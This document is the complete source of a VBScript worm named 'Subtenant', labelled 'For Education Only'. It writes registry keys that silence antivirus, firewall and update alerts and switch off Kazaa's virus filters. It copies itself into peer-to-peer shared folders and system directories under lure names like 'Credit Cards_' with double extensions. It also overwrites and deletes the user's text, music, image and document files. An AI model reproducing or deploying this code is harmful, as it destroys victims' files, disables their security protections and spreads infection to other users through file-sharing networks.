'     Name:Subtenant ** Author:pivA93 ** For Education Only
Dim fso, f, fo, ar1, ar2, sf, pf, key, f1, fil, fol, ext, otf, i
ar1=Array("18+ Movies_", "Exploited Girls List_", "Ftp List Divx_", "Credit Cards_", "Create Virus Tool_")
ar2=Array("DIVX", "mov", "JPG", "doc", "exe")
On Error Resume Next
pf="c:\program files\"
Set fso = CreateObject("Scripting.FileSystemObject")
Set f   = fso.GetFile(WScript.ScriptFullName)
Set key = WScript.CreateObject("WScript.Shell")
Set Shell = CreateObject("WScript.Shell")
sf= Shell.SpecialFolders("MyDocuments")

key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center","AntiVirusDisableNotify",1,"REG_DWORD"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center","FirewallDisableNotify",1,"REG_DWORD"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center","UpdatesDisableNotify",1,"REG_DWORD"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center","FirewallOverride",1,"REG_DWORD"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center","FirewallDisableNotify",1,"REG_DWORD"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner","¥Subtenant¥","REG_SZ"
key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","¥Subtenant¥","REG_SZ"
key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt",1,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DisableSharing",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\Adult_filter_level",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\Virus_filter",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\Bogus_filter",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\Firewall_filter",0,"REG_DWORD"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\Dir1","012345:c:\windows\Media","REG_SZ"
key.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\Dir2","012345:c:\program files\KazaA\My Shared Folder\","REG_SZ"

Call d(pf&"\Ares\appleJuice\incoming\")
Call d(pf&"\Ares\My Shared Folder\")
Call d(pf&"\America's Army\Screenshots\")
Call d(pf&"\BearShare\Shared\")
Call d(pf&"\Edonkey200\Incoming\")
Call d(pf&"\Gnucleus\downloads\incoming\")
Call d(pf&"\Grokster\My Shared Folder\")
Call d(pf&"\Icq\shared files\")
Call d(pf&"\KazaA\My Shared Folder\")
Call d(pf&"\KaZaA Lite\My Shared Folder\")
Call d(pf&"\KMD\My Shared Folder\")
Call d(pf&"\Limewire\Shared\")
Call d(pf&"\Morpheus\My Shared Folder\")
Call d(pf&"\Rapigator\Share\")
Call d(pf&"\Shareaza\Collections\")
Call d(pf&"\Shareaza\Downloads\")
Call d(pf&"\Swaptor\Download\")
Call d(pf&"\XoloX\downloads\Programs\")
Call d(pf&"\Winmx\Shared\")
Call d(sf&"\My Downloads\")
Call d(sf&"\My Music\")
Call d(sf&"\My Pictures\")
Call d(sf&"\My Shared Folder\")
Call d("c:\windows\media\")
Call d("c:\Winnt\System32\")
Call d("c:\Windows\System32\")
Call d("c:\My Shared Folder\")
Call d("c:\Bug\")

Sub d(Dir)
if (fso.FolderExists(Dir)) then
 Randomize
 n = Int(Rnd * 4)
 n2= Int(Rnd * 222)
 f.Copy(Dir & ar1(n) & n2 & "." & ar2(n) & ".vbs")
 f.attributes = attributes+n
 if n=1 then MsgBox "File Transfer Error - " & n2 , 16, "Error" end if

 Set fol = fso.GetFolder(Dir) 
 Set fil =  fol.Files 
 For Each f1 in fil
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  If ext="txt" or ext="mp3" or ext="gif" or ext="doc" Then
   fso.copyfile wscript.scriptfullname, f1.path, True
   fso.GetFile(f1.path)
   f.Copy (f1.path & ".vbs")

  If ext="txt" or ext="doc" then
   Set otf = fso.OpenTextFile(f1.path & ".vbs",8,True)
    otf.Write "'"
    for i = 1 to n2
     otf.Write chr(n2)
    next
    otf.close
  end if

   fSO.DeleteFile(f1.path)
   n=n+1
    if n>4 then exit for
  end if
 Next
end if
End Sub